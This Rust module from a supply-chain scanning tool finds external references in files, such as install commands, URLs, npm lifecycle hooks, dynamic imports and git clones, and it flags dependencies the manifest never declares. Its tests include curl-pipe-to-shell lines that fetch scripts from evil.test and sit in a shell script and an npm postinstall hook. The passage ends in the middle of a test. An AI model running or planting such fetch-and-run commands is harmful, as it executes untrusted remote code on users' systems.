//! Recognize external references in a parsed file — the "needle in the
//! haystack" half of fletch.
//!
//! filefacts already yields *declared* dependencies (manifest/lockfile fields)
//! on [`ParsedFile::references`]. This module returns those **plus** the
//! *undeclared / imperative* ones hunted out of command streams and decoded
//! text: a `curl … | sh`, an `npm install` in a `Dockerfile RUN`, a URL stashed
//! in a shell variable. The result is one unified list of [`ExternalRef`]s; the
//! caller hands it to [`crate::fetch`].
//!
//! Recognition is fuzzy by nature, so it lives here — away from filefacts'
//! deterministic format parsers and from the auditable fetch boundary.

use filefacts::{Arg, ExternalRef, FileType, ParsedFile, RefKind, RefLocator, Symbol};

/// All external references a file points at: filefacts' declared dependencies,
/// plus the imperative ones recognized here.
#[must_use]
pub fn references(parsed: &ParsedFile<'_>) -> Vec<ExternalRef> {
    let mut found = Found {
        refs: parsed.references().to_vec(),
        text: std::str::from_utf8(parsed.bytes()).ok(),
    };
    // Value-driven recognition (npm lifecycle hooks) works from facts alone, so
    // it runs for every file — it no-ops when there is no `npm.scripts` branch.
    npm_scripts(parsed.values().as_json(), &mut found);
    // String-driven recognition: URLs that stng surfaced from the extracted
    // strings — crucially including ones it recovered from *encoding* (a base64-
    // or url-encoded URL the raw bytes never show in the clear).
    extracted_refs(parsed, &mut found);
    // Text-driven recognition needs the raw bytes.
    match parsed.fileid().file_type() {
        FileType::Shell => scan_shell(found.text, "shell", &mut found),
        FileType::Dockerfile => scan_shell(found.text, "dockerfile", &mut found),
        FileType::JavaScript | FileType::TypeScript => {
            scan_source(found.text, "javascript", &mut found);
        }
        FileType::Python => scan_source(found.text, "python", &mut found),
        _ => {}
    }
    dedup(&mut found.refs);
    found.refs
}

/// References discoverable from a file's *facts* alone — its declared
/// references plus the value-driven recognizers (npm lifecycle hooks) — without
/// the raw bytes. This is what a consumer can run on an archive **member**,
/// whose bytes a prior analysis extracted and discarded but whose filefacts
/// values it retained. `values` is `filefacts::Values::as_json()`. The
/// text-driven recognizers (shell/Dockerfile command streams) are *not* covered
/// here — they need the bytes; use [`references`] when those are in hand.
#[must_use]
pub fn references_from_facts(
    values: &serde_json::Value,
    declared: &[ExternalRef],
) -> Vec<ExternalRef> {
    let mut found = Found {
        refs: declared.to_vec(),
        text: None,
    };
    npm_scripts(values, &mut found);
    dedup(&mut found.refs);
    found.refs
}

/// URLs recovered from the file's byte-scan extracted strings. These are the
/// verbatim printable/UTF-16LE runs (the `strings(1)` tier), so the string
/// value is itself the on-disk evidence the citation points at.
fn extracted_refs(parsed: &ParsedFile<'_>, out: &mut Found<'_>) {
    for s in parsed.text().iter() {
        for url in extract_urls(&s.value) {
            let evidence = s.value.clone();
            out.push(
                RefLocator::Url(url.to_string()),
                RefKind::UrlFetch,
                "string",
                evidence,
            );
        }
    }
}

/// Drop references whose locator already appeared, keeping the first. The same
/// URL or package legitimately surfaces through more than one recognizer
/// (declared, npm hook, decoded string, command stream).
fn dedup(refs: &mut Vec<ExternalRef>) {
    let mut seen = std::collections::HashSet::new();
    refs.retain(|r| {
        seen.insert(match &r.locator {
            RefLocator::Purl(p) => p.clone(),
            RefLocator::Url(u) => u.clone(),
        })
    });
}

/// Discover references in raw bytes: open them with filefacts and run
/// [`references`]. For callers that hold bytes rather than a parsed file (e.g.
/// a root sample on disk). Returns an empty list when filefacts can't parse the
/// input — discovery is best-effort, never an error.
#[must_use]
pub fn references_in_bytes(data: &[u8], filename: &str) -> Vec<ExternalRef> {
    match filefacts::open_with_path(std::path::Path::new(filename), data) {
        Ok(parsed) => references(&parsed),
        Err(_) => Vec::new(),
    }
}

/// Module-load calls recovered from a file's retained AST call symbols — the
/// facts-only path to the import vector. Unlike the text recognizers, this needs
/// no raw bytes, so it works on an archive **member** whose bytes a prior
/// analysis extracted and discarded: the `Call` symbols survive on the report.
/// A `require("pkg")` / `import("pkg")` (npm) or `__import__("pkg")` /
/// `importlib.import_module("pkg")` (PyPI) with a string-literal specifier is
/// emitted as the loaded package — the load verb implies the ecosystem.
///
/// Diffing the result against the manifest's declared deps (see
/// [`undeclared_packages`]) surfaces a load of an *undeclared* package — a
/// covertly-installed companion or a dependency-confusion target — even when no
/// install command is visible. A computed callee (`npm().install`, target
/// `None`) or non-literal argument yields nothing; relative paths and language
/// builtins are skipped by [`import_locator`].
#[must_use]
pub fn import_calls(symbols: &[Symbol]) -> Vec<ExternalRef> {
    let mut refs = Vec::new();
    for sym in symbols {
        let Symbol::Call {
            target: Some(target),
            args,
            offset,
        } = sym
        else {
            continue;
        };
        let eco = match target.as_str() {
            "require" | "import" => "npm",
            "__import__" | "import_module" | "importlib.import_module" => "pypi",
            _ => continue,
        };
        let Some(Arg::String { value }) = args.first() else {
            continue;
        };
        if let Some((locator, kind)) = import_locator(eco, value) {
            refs.push(ExternalRef {
                locator,
                kind,
                source: "ast-call".into(),
                evidence: value.clone(),
                offset: offset.unwrap_or(0),
                pinned_hash: None,
                content_sha256: None,
            });
        }
    }
    refs
}

/// The hunted package references whose package is **not** among the declared
/// dependencies — the phantom / undeclared-dependency set. Across a package's
/// aggregated references (its manifest's declared deps plus the imperative ones
/// hunted from every file) this surfaces a covertly-installed companion, a
/// dependency-confusion target, or a runtime-loaded package the manifest never
/// lists. Only imperative package references ([`RefKind::Command`] — install
/// commands and dynamic imports) are candidates; URL fetches and repository
/// identity are out of scope. Declared and hunted are matched by package
/// coordinate (ecosystem + name, version ignored), so a hunted `mobx` is
/// cancelled by a declared `mobx@^6`.
///
/// Pass the references for one package (root manifest + members) collected into
/// a single slice; a per-file call cannot see the manifest's declarations.
#[must_use]
pub fn undeclared_packages(refs: &[ExternalRef]) -> Vec<&ExternalRef> {
    let declared: std::collections::HashSet<&str> = refs
        .iter()
        .filter(|r| r.kind == RefKind::Dependency)
        .filter_map(|r| purl_coordinate(&r.locator))
        .collect();
    refs.iter()
        .filter(|r| r.kind == RefKind::Command)
        .filter(|r| purl_coordinate(&r.locator).is_some_and(|c| !declared.contains(c)))
        .collect()
}

/// A PURL's package coordinate — `pkg:<eco>/<name>` with any `@version` dropped,
/// so the same package compares equal whether or not a version pin is attached.
/// `None` for a non-PURL (URL) locator. A scoped npm name keeps its `%40` (an
/// encoded `@`), so only a real version delimiter is stripped.
fn purl_coordinate(loc: &RefLocator) -> Option<&str> {
    match loc {
        RefLocator::Purl(p) => Some(p.rsplit_once('@').map_or(p.as_str(), |(base, _)| base)),
        RefLocator::Url(_) => None,
    }
}

/// Accumulator that carries the file text so each pushed reference gets a
/// citable byte offset.
struct Found<'a> {
    refs: Vec<ExternalRef>,
    text: Option<&'a str>,
}

impl Found<'_> {
    /// Push an imperative reference (no pin), deriving its offset from the first
    /// occurrence of `evidence`, else the package-name/URL, else `0`.
    fn push(
        &mut self,
        locator: RefLocator,
        kind: RefKind,
        source: impl Into<String>,
        evidence: impl Into<String>,
    ) {
        let evidence = evidence.into();
        let offset = self
            .text
            .and_then(|t| {
                t.find(&evidence)
                    .or_else(|| t.find(&anchor_from_locator(&locator)))
            })
            .unwrap_or(0) as u64;
        self.refs.push(ExternalRef {
            locator,
            kind,
            source: source.into(),
            evidence,
            offset,
            pinned_hash: None,
            content_sha256: None,
        });
    }
}

/// npm lifecycle hooks: a `postinstall` that `wget … | sh` or `npm install`s a
/// package. The command string is the reference site. Reads the hooks from the
/// nested filefacts values JSON (`npm.scripts.{hook}`), so it works equally on a
/// live `ParsedFile` and on the retained facts of an archive member.
fn npm_scripts(values: &serde_json::Value, out: &mut Found<'_>) {
    let scripts = values.get("npm").and_then(|n| n.get("scripts"));
    let Some(scripts) = scripts else {
        return;
    };
    for hook in ["preinstall", "install", "postinstall"] {
        let Some(cmd) = scripts.get(hook).and_then(|v| v.as_str()) else {
            continue;
        };
        let source = format!("npm.scripts.{hook}");
        for url in extract_urls(cmd) {
            out.push(
                RefLocator::Url(url.to_string()),
                RefKind::UrlFetch,
                source.clone(),
                cmd,
            );
        }
        commands(cmd, &source, out);
    }
}

/// Scan a JavaScript/TypeScript/Python source body for package-manager
/// invocations expressed in *code* rather than on a shell line: a programmatic
/// install API (`npm().install("pkg", …)`), a list-form subprocess install
/// (`subprocess.run(["pip", "install", "pkg"])`), or a command embedded in a
/// string. Replacing source punctuation with spaces collapses all of these to
/// the same `<pm> install <pkg>` token stream the shell recognizer consumes —
/// so `npm().install("pkg")` and `["pip","install","pkg"]` both fall out.
///
/// A bare `obj.install(plugin)` (a DI/plugin call) stays invisible: with no
/// package-manager keyword as the leading token, `match_pm` never fires. This
/// is what turns a covert installer's own `npm`-aliasing disguise into the
/// detection hook, and lets the caller diff the hunted package against the
/// manifest's declared dependencies to surface an undeclared runtime install.
fn scan_source(text: Option<&str>, source: &str, out: &mut Found<'_>) {
    let Some(text) = text else {
        return;
    };
    let mut normalized = String::with_capacity(text.len());
    for c in text.chars() {
        match c {
            // Keep braces as their own tokens: they bound an options object
            // (`{ "no-save": true }`), and `commands` stops collecting package
            // args at a `{`, so option keys/values are not read as packages.
            '{' => normalized.push_str(" { "),
            '}' => normalized.push_str(" } "),
            '.' | '(' | ')' | '[' | ']' | ',' | '"' | '\'' | ':' => normalized.push(' '),
            other => normalized.push(other),
        }
    }
    commands(&normalized, source, out);
    // git_refs before urls so a `git+https://…` repo is classed Repository, not
    // a plain UrlFetch (dedup keeps whichever recognizer emits the URL first).
    git_refs(text, source, out);
    urls(text, source, out);
    // Dynamic module loads: `import("spec")` (JS/TS), `__import__`/`import_module`
    // (Python). Markers are language-specific; the install scan above is not.
    let (markers, eco): (&[&str], &str) = match source {
        "python" => (&["__import__(", "import_module("], "pypi"),
        _ => (&["import("], "npm"),
    };
    for marker in markers {
        dynamic_imports(text, marker, eco, source, out);
    }
}

/// Recognize *dynamic* module loads — `import("spec")`, `__import__("spec")`,
/// `import_module("spec")` — and emit the loaded package (a bare specifier) or
/// URL (a remote `import()`). These resolve a module name at runtime, so a
/// static dependency resolver never sees them; diffing the hunted name against
/// the manifest's declared deps surfaces a load of an *undeclared* package — a
/// covertly-installed companion or a dependency-confusion target. A static
/// `import x` / literal `require("x")` is declared-intent and handled by the
/// manifest extractor; only the runtime-resolved call forms are hunted here.
///
/// The package is emitted as [`RefKind::Command`] (the fetchable "imperative
/// package" kind) rather than a new kind: the locator is what the caller diffs
/// and fetches, and a runtime import is the same imperative acquisition an
/// `npm install` is. Relative paths and language builtins are skipped — they
/// are never undeclared external dependencies.
fn dynamic_imports(text: &str, marker: &str, eco: &str, source: &str, out: &mut Found<'_>) {
    let mut start = 0;
    while let Some(rel) = text[start..].find(marker) {
        let at = start + rel + marker.len();
        start = at; // always past the marker → terminates
        let Some(spec) = leading_string_literal(&text[at..]) else {
            continue;
        };
        if let Some((locator, kind)) = import_locator(eco, spec) {
            out.push(locator, kind, source, spec);
        }
    }
}

/// The string literal at the start of `s` (after optional whitespace), or
/// `None` if `s` does not begin with a `'`, `"`, or backtick quote — i.e. the
/// argument is a computed expression whose module name is not statically known.
fn leading_string_literal(s: &str) -> Option<&str> {
    let s = s.trim_start();
    let quote = s.chars().next()?;
    if quote != '"' && quote != '\'' && quote != '`' {
        return None;
    }
    let rest = &s[quote.len_utf8()..];
    let end = rest.find(quote)?;
    let spec = &rest[..end];
    // A real specifier has no whitespace and is not a template interpolation.
    (!spec.is_empty() && !spec.contains(['$', ' ', '\n', '\t'])).then_some(spec)
}

/// Classify a dynamic-import specifier into a fetchable reference, or `None` for
/// a relative path or a language builtin (never an undeclared external dep).
fn import_locator(eco: &str, spec: &str) -> Option<(RefLocator, RefKind)> {
    if spec.contains("://") {
        return Some((RefLocator::Url(spec.to_string()), RefKind::UrlFetch));
    }
    if spec.starts_with('.') || spec.starts_with('/') {
        return None; // relative/absolute path, not a package
    }
    let purl = match eco {
        "npm" => {
            let bare = spec.strip_prefix("node:").unwrap_or(spec);
            if NODE_BUILTINS.contains(&bare) {
                return None;
            }
            npm_purl_token(&npm_import_package(spec)?)?
        }
        "pypi" => {
            let top = spec.split(['.', ':']).next()?;
            if top.is_empty() || PY_STDLIB.contains(&top) {
                return None;
            }
            pypi_purl_token(top)?
        }
        _ => return None,
    };
    Some((RefLocator::Purl(purl), RefKind::Command))
}

/// The installable package name from a JS import specifier: `@scope/name` from
/// `@scope/name/sub`, or `name` from `name/sub` (a deep import's subpath is not
/// part of the package identity).
fn npm_import_package(spec: &str) -> Option<String> {
    if let Some(rest) = spec.strip_prefix('@') {
        let mut parts = rest.splitn(2, '/');
        let scope = parts.next()?;
        let name = parts.next()?.split('/').next()?;
        (!scope.is_empty() && !name.is_empty()).then(|| format!("@{scope}/{name}"))
    } else {
        let name = spec.split('/').next()?;
        (!name.is_empty()).then(|| name.to_string())
    }
}

/// Node.js builtin modules — a dynamic `import("fs")` is the runtime, not an
/// external dependency, so it is never hunted as undeclared.
const NODE_BUILTINS: &[&str] = &[
    "assert",
    "async_hooks",
    "buffer",
    "child_process",
    "cluster",
    "console",
    "constants",
    "crypto",
    "dgram",
    "diagnostics_channel",
    "dns",
    "domain",
    "events",
    "fs",
    "http",
    "http2",
    "https",
    "inspector",
    "module",
    "net",
    "os",
    "path",
    "perf_hooks",
    "process",
    "punycode",
    "querystring",
    "readline",
    "repl",
    "stream",
    "string_decoder",
    "sys",
    "timers",
    "tls",
    "trace_events",
    "tty",
    "url",
    "util",
    "v8",
    "vm",
    "wasi",
    "worker_threads",
    "zlib",
];

/// Common Python standard-library top-level modules — a dynamic
/// `import_module("os")` is the runtime, not an external dependency.
const PY_STDLIB: &[&str] = &[
    "__future__",
    "abc",
    "argparse",
    "asyncio",
    "base64",
    "builtins",
    "collections",
    "contextlib",
    "copy",
    "ctypes",
    "datetime",
    "functools",
    "glob",
    "gzip",
    "hashlib",
    "hmac",
    "http",
    "importlib",
    "inspect",
    "io",
    "itertools",
    "json",
    "logging",
    "math",
    "os",
    "pathlib",
    "pickle",
    "platform",
    "queue",
    "random",
    "re",
    "shutil",
    "socket",
    "ssl",
    "string",
    "struct",
    "subprocess",
    "sys",
    "tempfile",
    "threading",
    "time",
    "traceback",
    "types",
    "typing",
    "urllib",
    "uuid",
    "warnings",
    "zipfile",
    "zlib",
];

/// Recognize git source references — a `git clone <url>` command, or a
/// `git+<scheme>://…` VCS package specifier (`pip install git+https://…`, an npm
/// `git+ssh://` dependency). Cloning or installing from a repo pulls in external
/// source that bypasses the package registry, so it is a fetch target in its own
/// right — emitted as a [`RefKind::Repository`]. SSH (`git@host:…`) and `git+`
/// forms that the http-only `extract_urls` would miss are covered here. Runs on
/// raw (un-normalized) text, so `://` survives.
fn git_refs(text: &str, source: &str, out: &mut Found<'_>) {
    for line in text.lines() {
        let evidence = line.trim();
        // `git+<scheme>://…` / `git+git@…` VCS specifiers — strip the `git+`.
        let mut rest = line;
        while let Some(i) = rest.find("git+") {
            let spec = &rest[i + 4..];
            let token = git_url_token(spec);
            rest = &spec[token.len()..];
            if let Some(repo) = normalize_git_target(token) {
                out.push(RefLocator::Url(repo), RefKind::Repository, source, evidence);
            }
        }
        // `git clone [flags] <target>`.
        if let Some(target) = git_clone_target(line)
            && let Some(repo) = normalize_git_target(target)
        {
            out.push(RefLocator::Url(repo), RefKind::Repository, source, evidence);
        }
    }
}

/// The git-URL token at the start of `s`, up to whitespace or a shell/source
/// delimiter (quote, comma, paren, bracket).
fn git_url_token(s: &str) -> &str {
    let end = s
        .find(|c: char| {
            c.is_whitespace() || matches!(c, '"' | '\'' | '`' | ',' | '(' | ')' | '[' | ']')
        })
        .unwrap_or(s.len());
    &s[..end]
}

/// The clone target of a `git clone [flags] <target>` line — the first
/// non-flag argument after `git clone`. `None` if the line is not a clone.
fn git_clone_target(line: &str) -> Option<&str> {
    let toks: Vec<&str> = line.split_whitespace().collect();
    let pos = toks
        .windows(2)
        .position(|w| w[0] == "git" && w[1] == "clone")?;
    toks[pos + 2..]
        .iter()
        .find(|t| !t.starts_with('-'))
        .copied()
}

/// A validated git target: a URL (`scheme://…`) or SSH shorthand (`git@host:…`),
/// with surrounding quotes and a trailing `.git` stripped. `None` for anything
/// that is not a git remote.
fn normalize_git_target(s: &str) -> Option<String> {
    let s = s.trim_matches(|c| matches!(c, '"' | '\'' | '`' | ')' | ']' | ','));
    let is_git = s.contains("://") || s.starts_with("git@");
    (is_git && s.len() >= 8).then(|| s.trim_end_matches(".git").to_string())
}

/// Scan a shell script / Dockerfile body for package-manager commands and URLs.
fn scan_shell(text: Option<&str>, source: &str, out: &mut Found<'_>) {
    let Some(text) = text else {
        return;
    };
    commands(text, source, out);
    git_refs(text, source, out);
    urls(text, source, out);
}

/// Recognize package-manager install commands and emit a [`RefKind::Command`]
/// per named package. Splits on command separators, joins `\` line
/// continuations, and matches the invocation anywhere in a segment.
fn commands(scan: &str, source: &str, out: &mut Found<'_>) {
    let joined = scan.replace("\\\r\n", " ").replace("\\\n", " ");
    for seg in joined.split([';', '&', '|', '\n', '\r']) {
        let seg = seg.trim();
        if seg.is_empty() {
            continue;
        }
        let toks: Vec<&str> = seg.split_whitespace().collect();
        for i in 0..toks.len() {
            let Some((eco, consumed)) = match_pm(&toks[i..]) else {
                continue;
            };
            for arg in &toks[i + consumed..] {
                if arg.starts_with('>') || arg.starts_with('<') || *arg == "{" {
                    break; // a redirect, or an options-object `{`, ends the list
                }
                if let Some(locator) = pm_token_locator(eco, arg) {
                    out.push(locator, RefKind::Command, source, seg);
                }
            }
            break; // the rest of the segment is this command's arguments
        }
    }
}

/// Scan text line-by-line for `http`/`https` URLs (curl/wget targets, a URL in
/// a variable) and emit a [`RefKind::UrlFetch`] per URL.
fn urls(text: &str, source: &str, out: &mut Found<'_>) {
    for line in text.lines() {
        for url in extract_urls(line) {
            out.push(
                RefLocator::Url(url.to_string()),
                RefKind::UrlFetch,
                source,
                line.trim(),
            );
        }
    }
}

/// Recognize a package-manager invocation at the start of a token slice,
/// returning its ecosystem and how many tokens the invocation spans
/// (`npm install` → 2, `uv pip install` → 3).
fn match_pm(toks: &[&str]) -> Option<(&'static str, usize)> {
    match *toks.first()? {
        // One-shot remote runners fetch-and-run a package without declaring it
        // (`npx pkg`, `bunx pkg`, `uvx pkg`); the package follows immediately.
        "npx" | "bunx" => Some(("npm", 1)),
        "uvx" => Some(("pypi", 1)),
        // install/add, plus `pnpm dlx` / `yarn dlx` / `bun x` which run a
        // package (fetching it if absent) without declaring it.
        "npm" | "pnpm" | "yarn" | "bun" => {
            matches!(*toks.get(1)?, "install" | "i" | "add" | "a" | "dlx" | "x")
                .then_some(("npm", 2))
        }
        // CLI `pip install`, and the programmatic forms `pip.main(["install",…])`
        // / `pip._internal.main(["install",…])` — once scan_source flattens the
        // punctuation these read as `pip … install <pkg>`, so accept `install`
        // within the next few tokens, not only at position 1.
        "pip" | "pip3" => toks
            .get(1..)?
            .iter()
            .take(3)
            .position(|t| *t == "install")
            .map(|i| ("pypi", i + 2)),
        "pipx" => matches!(*toks.get(1)?, "install" | "run").then_some(("pypi", 2)),
        "uv" => match *toks.get(1)? {
            "pip" if toks.get(2) == Some(&"install") => Some(("pypi", 3)),
            "add" => Some(("pypi", 2)),
            _ => None,
        },
        // Deno installs/runs explicit specifiers; the per-token prefix
        // (`npm:`/`jsr:`/`https:`) picks the ecosystem, resolved in
        // `deno_purl_token`. A bare/URL specifier yields no package (URLs are
        // caught by `urls`).
        "deno" => {
            matches!(*toks.get(1)?, "install" | "add" | "cache" | "run").then_some(("deno", 2))
        }
        // `go get`/`go install <module>@<version>` and `cargo install <crate>`
        // resolve to fetchable artifacts; gem/composer/apt are recorded for now.
        "go" => matches!(*toks.get(1)?, "get" | "install").then_some(("golang", 2)),
        "cargo" => (*toks.get(1)? == "install").then_some(("cargo", 2)),
        "gem" => (*toks.get(1)? == "install").then_some(("gem", 2)),
        "conda" | "mamba" | "micromamba" => (*toks.get(1)? == "install").then_some(("conda", 2)),
        "composer" => (*toks.get(1)? == "require").then_some(("composer", 2)),
        "apt-get" | "apt" | "aptitude" => (*toks.get(1)? == "install").then_some(("deb", 2)),
        _ => None,
    }
}

/// A command argument as a package locator, or `None` if it is a flag, file,
/// path, or URL rather than a named package.
fn pm_token_locator(eco: &str, tok: &str) -> Option<RefLocator> {
    if !looks_like_package(eco, tok) {
        return None;
    }
    let purl = match eco {
        "npm" => npm_purl_token(tok)?,
        "pypi" => pypi_purl_token(tok)?,
        "golang" => version_purl_token("golang", tok, '@')?,
        "cargo" => version_purl_token("cargo", tok, '@')?,
        "deb" => version_purl_token("deb", tok, '=')?,
        "gem" => (!tok.is_empty()).then(|| format!("pkg:gem/{tok}"))?,
        "conda" => conda_purl_token(tok)?,
        "deno" => deno_purl_token(tok)?,
        "composer" => composer_purl_token(tok)?,
        _ => return None,
    };
    Some(RefLocator::Purl(purl))
}

/// Whether a command argument looks like a named package rather than a flag, a
/// URL, a path, or a file. Slashes are ecosystem-specific: npm allows one in a
/// `@scope/name`, Go/Composer names are `host/path` or `vendor/name`, the rest
/// reject `/` (it means a path).
fn looks_like_package(eco: &str, tok: &str) -> bool {
    let first = tok.chars().next().unwrap_or(' ');
    if !(first.is_ascii_alphanumeric() || first == '@') {
        return false; // flags, redirects, `./local`
    }
    if tok.contains("://") {
        return false; // a URL, not a named package
    }
    if tok.contains('/') {
        let slash_ok = match eco {
            "npm" => tok.starts_with('@') && tok.matches('/').count() == 1,
            // deno `jsr:@scope/name` / `npm:@scope/pkg` specifiers carry a slash;
            // URL specifiers are already rejected by the `://` check above.
            "golang" | "composer" | "deno" => true,
            _ => false,
        };
        if !slash_ok {
            return false;
        }
    }
    const FILE_EXT: &[&str] = &[
        ".txt", ".whl", ".toml", ".lock", ".cfg", ".tar", ".gz", ".zip", ".py", ".js",
    ];
    !FILE_EXT.iter().any(|e| tok.ends_with(e))
}

/// `pkg:<eco>/<name>[@<version>]` from a token whose version (if any) follows
/// `sep` (`@` for Go/cargo, `=` for apt). The name keeps its real case (Go
/// module paths are case-sensitive).
fn version_purl_token(eco: &str, tok: &str, sep: char) -> Option<String> {
    let (name, version) = tok
        .split_once(sep)
        .map_or((tok, None), |(n, v)| (n, Some(v)));
    if name.is_empty() {
        return None;
    }
    Some(match version {
        Some(v) if !v.is_empty() => format!("pkg:{eco}/{name}@{v}"),
        _ => format!("pkg:{eco}/{name}"),
    })
}

/// `pkg:composer/<vendor>/<name>` from a `composer require` token, dropping any
/// `:<constraint>` (a range, not a fetchable pin). Composer names are always
/// `vendor/name`.
fn composer_purl_token(tok: &str) -> Option<String> {
    let name = tok.split(':').next().unwrap_or(tok);
    (name.contains('/') && !name.is_empty()).then(|| format!("pkg:composer/{name}"))
}

/// `pkg:conda/<name>[@<version>]` from a `conda install` token, dropping a
/// `channel::` prefix and a trailing `=`/`==` version constraint.
fn conda_purl_token(tok: &str) -> Option<String> {
    let name_ver = tok.rsplit("::").next().unwrap_or(tok);
    let (name, ver) = name_ver.split_once('=').map_or((name_ver, None), |(n, v)| {
        (n, Some(v.trim_start_matches('=')))
    });
    if name.is_empty() {
        return None;
    }
    Some(match ver {
        Some(v) if !v.is_empty() => format!("pkg:conda/{name}@{v}"),
        _ => format!("pkg:conda/{name}"),
    })
}

/// A PURL from a Deno specifier: `npm:<pkg>` resolves to the npm registry,
/// `jsr:@scope/name` to JSR. A URL specifier (`https://…`) yields `None` — it
/// is a plain fetch surfaced by `urls`, not a registry package.
fn deno_purl_token(tok: &str) -> Option<String> {
    if let Some(spec) = tok.strip_prefix("npm:") {
        npm_purl_token(spec)
    } else if let Some(spec) = tok.strip_prefix("jsr:") {
        jsr_purl_token(spec)
    } else {
        None
    }
}

/// `pkg:jsr/%40<scope>/<name>[@<version>]` from a JSR specifier, which is always
/// scoped (`@scope/name`). The `@` scope marker is percent-encoded as in npm.
fn jsr_purl_token(spec: &str) -> Option<String> {
    let (name, ver) = match spec.rfind('@') {
        Some(0) | None => (spec, None),
        Some(i) => (&spec[..i], Some(&spec[i + 1..])),
    };
    let (scope, pkg) = name.strip_prefix('@')?.split_once('/')?;
    if scope.is_empty() || pkg.is_empty() {
        return None;
    }
    let base = format!("pkg:jsr/%40{scope}/{pkg}");
    Some(match ver {
        Some(v) if !v.is_empty() => format!("{base}@{v}"),
        _ => base,
    })
}

/// `pkg:npm/...` from a command-line token (`foo`, `foo@1.2`, `@s/n`,
/// `@s/n@1.2`). `None` if the name is empty.
fn npm_purl_token(tok: &str) -> Option<String> {
    let (name, ver) = match tok.rfind('@') {
        Some(0) | None => (tok, None), // leading scope `@`, or no version
        Some(i) => (&tok[..i], Some(&tok[i + 1..])),
    };
    if name.is_empty() {
        return None;
    }
    let base = match name.strip_prefix('@').and_then(|s| s.split_once('/')) {
        Some((scope, pkg)) => format!("pkg:npm/%40{scope}/{pkg}"),
        None => format!("pkg:npm/{name}"),
    };
    Some(match ver {
        Some(v) if !v.is_empty() => format!("{base}@{v}"),
        _ => base,
    })
}

/// `pkg:pypi/...` from a command-line token, stripping extras (`pkg[x]`) and
/// version constraints (only an `==` pin becomes a PURL version).
fn pypi_purl_token(tok: &str) -> Option<String> {
    // Strip an `[extras]` span anywhere, keeping any trailing version.
    let base = match (tok.find('['), tok.find(']')) {
        (Some(o), Some(c)) if c > o => format!("{}{}", &tok[..o], &tok[c + 1..]),
        _ => tok.to_string(),
    };
    let name = base
        .split(['=', '>', '<', '~', '!', ';', ',', ' '])
        .next()
        .unwrap_or(&base)
        .trim();
    if name.is_empty() {
        return None;
    }
    let ver = base
        .split_once("==")
        .map(|(_, v)| v.split([',', ';', ' ']).next().unwrap_or(v))
        .filter(|v| !v.is_empty());
    Some(match ver {
        Some(v) => format!("pkg:pypi/{name}@{v}"),
        None => format!("pkg:pypi/{name}"),
    })
}

/// A findable substring for locating a reference when its full `evidence` isn't
/// verbatim in the file — the URL, or a PURL's package name (`%40`→`@`, version
/// stripped).
fn anchor_from_locator(loc: &RefLocator) -> String {
    match loc {
        RefLocator::Url(u) => u.clone(),
        RefLocator::Purl(p) => {
            let body = p.strip_prefix("pkg:").unwrap_or(p);
            let body = body.split_once('/').map_or(body, |(_, rest)| rest); // drop type
            let name = body.split('@').next().unwrap_or(body); // drop @version
            name.replace("%40", "@")
        }
    }
}

/// Yield each `http`/`https` URL embedded in a string. A URL runs until the
/// first character that cannot appear in one unquoted in a shell command.
fn extract_urls(cmd: &str) -> UrlScan<'_> {
    UrlScan { rest: cmd }
}

struct UrlScan<'a> {
    rest: &'a str,
}

impl<'a> Iterator for UrlScan<'a> {
    type Item = &'a str;

    fn next(&mut self) -> Option<&'a str> {
        loop {
            let start = self.rest.find("http")?;
            let cand = &self.rest[start..];
            let is_url = cand.starts_with("http://") || cand.starts_with("https://");
            if !is_url {
                self.rest = &cand[4..];
                continue;
            }
            let end = cand
                .find(|c: char| {
                    c.is_whitespace()
                        || matches!(
                            c,
                            '"' | '\'' | '|' | ';' | '`' | '<' | '>' | '(' | ')' | ','
                        )
                })
                .unwrap_or(cand.len());
            let url = &cand[..end];
            self.rest = &cand[end..];
            if url.len() > "https://".len() {
                return Some(url);
            }
        }
    }
}

#[cfg(test)]
#[allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)]
mod tests {
    use super::*;

    #[test]
    fn shell_pkg_manager_commands_and_urls() {
        let script = "#!/bin/sh\n\
            URL1=\"https://web.stanford.edu/~pseay/pliant/et\"\n\
            sudo npm install evil-pkg\n\
            uv pip install requests==2.1 flask\n\
            curl -fsSL https://evil.test/stage2.sh | sh\n";
        let mut out = Found {
            refs: Vec::new(),
            text: Some(script),
        };
        scan_shell(out.text, "shell", &mut out);
        let purls: Vec<_> = out
            .refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Purl(p) => Some(p.as_str()),
                RefLocator::Url(_) => None,
            })
            .collect();
        assert!(purls.contains(&"pkg:npm/evil-pkg"));
        assert!(purls.contains(&"pkg:pypi/requests@2.1"));
        assert!(purls.contains(&"pkg:pypi/flask"));
        let url_refs: Vec<_> = out
            .refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Url(u) => Some(u.as_str()),
                RefLocator::Purl(_) => None,
            })
            .collect();
        assert!(url_refs.contains(&"https://web.stanford.edu/~pseay/pliant/et"));
        assert!(url_refs.contains(&"https://evil.test/stage2.sh"));
    }

    #[test]
    fn scoped_and_versioned_tokens() {
        assert_eq!(
            npm_purl_token("@acme/tool"),
            Some("pkg:npm/%40acme/tool".to_string())
        );
        assert_eq!(
            npm_purl_token("evil@2.0"),
            Some("pkg:npm/evil@2.0".to_string())
        );
        assert_eq!(
            pypi_purl_token("requests[security]==2.1"),
            Some("pkg:pypi/requests@2.1".to_string())
        );
    }

    #[test]
    fn references_from_facts_finds_npm_install_hooks() {
        // The nested values shape filefacts emits for a package.json, exactly as
        // it survives in an archive member's retained facts.
        let values = serde_json::json!({
            "npm": { "scripts": {
                "postinstall": "curl -fsSL https://evil.test/s.sh | sh",
                "preinstall": "npm install sketchy-pkg"
            }}
        });
        let refs = references_from_facts(&values, &[]);
        let urls: Vec<_> = refs
            .iter()
            .map(|r| match &r.locator {
                RefLocator::Url(u) => u.as_str(),
                RefLocator::Purl(p) => p.as_str(),
            })
            .collect();
        assert!(
            urls.contains(&"https://evil.test/s.sh"),
            "postinstall url: {refs:?}"
        );
        assert!(
            urls.contains(&"pkg:npm/sketchy-pkg"),
            "preinstall pkg: {refs:?}"
        );
        // No npm.scripts branch → declared refs pass through untouched.
        assert!(references_from_facts(&serde_json::json!({"npm":{"name":"x"}}), &[]).is_empty());
    }

    #[test]
    fn recognizes_go_cargo_gem_composer_apt_installs() {
        let script = "#!/bin/sh\n\
            go get github.com/evil/mod@v1.2.3\n\
            cargo install badcrate\n\
            gem install evilgem\n\
            composer require evil/pkg:^2.0\n\
            apt-get install -y sneakydeb nginx=1.18.0\n";
        let mut out = Found {
